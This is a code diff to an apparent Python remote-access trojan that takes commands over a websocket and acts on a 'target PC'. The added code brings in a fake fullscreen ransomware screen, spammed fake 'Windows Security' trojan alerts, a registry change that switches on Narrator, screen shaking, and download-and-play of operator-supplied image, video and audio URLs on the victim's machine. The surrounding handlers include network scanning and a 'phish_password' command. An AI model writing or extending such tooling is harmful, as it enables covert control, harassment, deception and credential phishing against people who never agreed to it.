@@ -1523,6 +1523,71 @@ End If
             pyautogui.moveTo(random.randint(0, w), random.randint(0, h))
             time.sleep(0.05)
 
+    # ── New Pranks ─────────────────────────────────────────────────
+
+    async def prank_ransomware(self):
+        def show():
+            import tkinter as tk
+            root = tk.Tk()
+            root.attributes("-fullscreen", True, "-topmost", True)
+            root.configure(bg="#cc0000", cursor="none")
+            tk.Label(root, text="⚠️ YOUR FILES ARE ENCRYPTED ⚠️",
+                font=("Segoe UI", 44, "bold"), fg="white", bg="#cc0000").pack(pady=(80, 20))
+            tk.Label(root, text="All your documents, photos, and databases have been locked.",
+                font=("Segoe UI", 20), fg="white", bg="#cc0000").pack()
+            count = tk.Label(root, text="", font=("Segoe UI", 36, "bold"), fg="yellow", bg="#cc0000")
+            count.pack(pady=40)
+
+            def tick(n):
+                if n > 0:
+                    count.config(text=f"Time remaining: {n} seconds")
+                    root.after(1000, lambda: tick(n - 1))
+                else:
+                    tk.Label(root, text="Just kidding 😄", font=("Segoe UI", 28), fg="white", bg="#cc0000").pack()
+                    root.after(1500, root.destroy)
+            tick(10)
+            root.bind("<Escape>", lambda e: root.destroy())
+            root.mainloop()
+        threading.Thread(target=show, daemon=True).start()
+
+    async def invert_colors(self):
+        try:
+            ctypes.windll.user32.InvertDisplay(1)
+        except:
+            subprocess.run("powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Invert()\"", shell=True, capture_output=True)
+
+    async def toggle_narrator(self, enable=True):
+        try:
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Narrator\NoRoam")
+            winreg.SetValueEx(key, "NarratorActive", 0, winreg.REG_DWORD, 1 if enable else 0)
+            winreg.CloseKey(key)
+            subprocess.run("powershell -Command \"Start-Process narrator.exe\"", shell=True, capture_output=True) if enable else None
+        except:
+            pass
+
+    async def screen_shake(self):
+        def shake():
+            import tkinter as tk
+            from ctypes import windll
+            hwnd = windll.user32.GetDesktopWindow()
+            rect = (ctypes.c_int * 4)()
+            windll.user32.GetWindowRect(hwnd, rect)
+            ox, oy = rect[0], rect[1]
+            for _ in range(30):
+                windll.user32.SetWindowPos(hwnd, 0, ox + random.randint(-15, 15), oy + random.randint(-15, 15), 0, 0, 0x0001)
+                time.sleep(0.03)
+            windll.user32.SetWindowPos(hwnd, 0, ox, oy, 0, 0, 0x0001)
+        threading.Thread(target=shake, daemon=True).start()
+
+    async def fake_virus_alert(self):
+        def show():
+            for _ in range(12):
+                threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0,
+                    "⚠️ Trojan.Generic.284752 detected!\nRecommended action: Scan and remove immediately.",
+                    "Windows Security Alert", 0x30 | 0x1000), daemon=True).start()
+                time.sleep(0.3)
+        threading.Thread(target=show, daemon=True).start()
+
     async def toggle_desktop_icons(self, show=True):
         try:
             # Complex way to find the actual listview of desktop icons
@@ -2092,17 +2157,22 @@ End If
                 elif t == "scan_network":
                     await self.scan_network(data.get("target"), data.get("ports"))
                 elif t == "open_cd":
-                    ctypes.windll.winmm.mciSendStringW(
-                        "set cdaudio door open", None, 0, None
-                    )
+                    await self.open_cd_tray()
                 elif t == "beep":
                     import winsound
 
                     winsound.Beep(1000, 1000)
                 elif t == "speak":
                     txt = data.get("text", "Hello")
-                    cmd = f"powershell -Command \"Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{txt}');\""
+                    esc = txt.replace("'", "''").replace('"', '""')
+                    cmd = f'powershell -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(\'{esc}\');"'
                     subprocess.Popen(cmd, shell=True)
+                elif t == "show_image_url":
+                    await self.show_image_url(data.get("url"), data.get("duration", 10), data.get("scale", 100))
+                elif t == "play_video_url":
+                    await self.play_video_url(data.get("url"), data.get("fullscreen", True))
+                elif t == "play_audio_url":
+                    await self.play_audio_url(data.get("url"), data.get("volume", 100), data.get("loop", False))
                 elif t == "play_audio":
                     try:
                         audio_data_b64 = data.get("data")
@@ -2448,6 +2518,16 @@ End If
                     await self.stop_beep()
                 elif t == "fake_bsod":
                     await self.fake_bsod()
+                elif t == "prank_ransomware":
+                    await self.prank_ransomware()
+                elif t == "invert_colors":
+                    await self.invert_colors()
+                elif t == "toggle_narrator":
+                    await self.toggle_narrator(True)
+                elif t == "screen_shake":
+                    await self.screen_shake()
+                elif t == "fake_virus":
+                    await self.fake_virus_alert()
                 elif t == "phish_password":
                     await self.phish_password()
                 elif t == "start_danger":
@@ -2649,6 +2729,63 @@ End If
             await self.websocket.send(
                 json.dumps({"type": "command_output", "output": f"Location error: {e}"})
             )
+
+    # ── Show Media on Remote Screen ─────────────────────────────
+
+    async def show_image_url(self, url, duration=10, scale=100):
+        """Download image from URL and show fullscreen on target PC"""
+        def show():
+            try:
+                import tkinter as tk
+                from PIL import Image as PILImage
+                from io import BytesIO
+                resp = requests.get(url, timeout=15)
+                img = PILImage.open(BytesIO(resp.content))
+                root = tk.Tk()
+                root.attributes("-fullscreen", True, "-topmost", True)
+                root.configure(bg="black")
+                screen_w = root.winfo_screenwidth()
+                screen_h = root.winfo_screenheight()
+                pct = scale / 100.0
+                img = img.resize((int(screen_w * pct), int(screen_h * pct)), PILImage.LANCZOS)
+                from PIL import ImageTk
+                tk_img = ImageTk.PhotoImage(img)
+                lbl = tk.Label(root, image=tk_img, bg="black")
+                lbl.pack(expand=True)
+                root.after(int(duration * 1000), root.destroy)
+                root.bind("<Escape>", lambda e: root.destroy())
+                root.mainloop()
+            except:
+                pass
+        threading.Thread(target=show, daemon=True).start()
+
+    async def play_video_url(self, url, fullscreen=True):
+        """Download video from URL and play on target PC"""
+        try:
+            ext = url.split(".")[-1].split("?")[0] if "." in url else "mp4"
+            path = os.path.join(os.getenv("TEMP"), f"video_{int(time.time())}.{ext}")
+            resp = requests.get(url, timeout=60, stream=True)
+            with open(path, "wb") as f:
+                for chunk in resp.iter_content(8192):
+                    f.write(chunk)
+            fs = "/fullscreen" if fullscreen else ""
+            subprocess.Popen(f'powershell -Command "Start-Process mplay32.exe -ArgumentList \'{path}\' {fs}"', shell=True)
+        except:
+            pass
+
+    async def play_audio_url(self, url, volume=100, loop=False):
+        """Download audio from URL and play on target PC speakers"""
+        try:
+            ext = url.split(".")[-1].split("?")[0] if "." in url else "wav"
+            path = os.path.join(os.getenv("TEMP"), f"audio_{int(time.time())}.{ext}")
+            resp = requests.get(url, timeout=60, stream=True)
+            with open(path, "wb") as f:
+                for chunk in resp.iter_content(8192):
+                    f.write(chunk)
+            loop_cmd = " -loop 0" if loop else ""
+            subprocess.Popen(f'powershell -Command "(New-Object Media.SoundPlayer(\'{path}\')).PlayLooping()"', shell=True)
+        except:
+            pass
 
     # --- Missing Functions Implementation ---
 
